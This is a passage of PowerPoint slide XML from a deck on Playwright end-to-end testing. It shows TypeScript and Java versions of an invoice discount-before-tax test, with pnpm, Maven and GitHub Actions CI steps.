                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: pnpm e2e           </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># headless, CI=true</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/upload-artifact@cf430e03…</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if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: ${{ !cancelled() }}</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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { name: ts-app-e2e-report }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="E4E6EB"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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0" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976872" y="1517904"/>
            <a:ext cx="4663440" cy="6400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800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Interactive: pnpm e2e:ui</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>UI mode: watch, step through, time-travel traces</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2331720"/>
            <a:ext cx="5394960" cy="251460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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>e2e/invoice.spec.ts (simplified)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"discount before tax"</a:t>
            </a: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async</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> ({ page }) =&gt; {</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await</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Unit price 1"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"1000"</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await</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Tax rate (%)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"10"</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await</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Discount (%)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"10"</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await</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> page.getByRole(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"button"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, { name: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Calculate"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> })</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.click();</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await</a:t>
            </a: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expect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(page.getByTestId(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"total"</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.toHaveText(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"990.00"</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="E4E6EB"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Self repo note"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5120640"/>
            <a:ext cx="11091672" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20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3" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5120640"/>
            <a:ext cx="10698480" cy="54864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300" b="1">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>webServer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>in playwright.config.ts: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>builds and starts the app first. CI keeps the HTML report and traces.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Icon 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{973597BE-D09E-CCE1-6E55-30E482C6BAE8}"/>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84703" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Icon 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B10F2BAB-9897-8D66-1E58-20B81FFEED9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6381415" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2920490209"/>
      </p:ext>
    </p:extLst>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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>End-to-end tests in Java</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a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Same page, same tests: Playwright for Java + JUnit, behind a Maven profile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1517904"/>
            <a:ext cx="4663440" cy="6400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800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Non-interactive: -Pe2e</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./mvnw -Pe2e test: headless, what CI runs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="5394960" cy="251460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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>java-ci.yml: e2e job</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>e2e</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steps</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: Install Chromium   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># Playwright CLI in the jar</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run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: ./mvnw -Pe2e test-compile exec:java</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-Dexec.mainClass=com.microsoft.playwright.CLI …</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: ./mvnw -Pe2e test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env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: "1" }</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/upload-artifact@cf430e03…</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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { name: java-app-e2e-report }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="E4E6EB"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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0" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976872" y="1517904"/>
            <a:ext cx="4663440" cy="6400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800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Interactive: -Pe2e,e2e-ui</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Headed browser + Playwright Inspector</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2331720"/>
            <a:ext cx="5394960" cy="251460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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>InvoicePageE2eTest.java (simplified)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>@Test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>void</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> appliesTheDiscountBeforeTax() {</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page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Unit price 1"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"1000"</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page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Tax rate (%)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
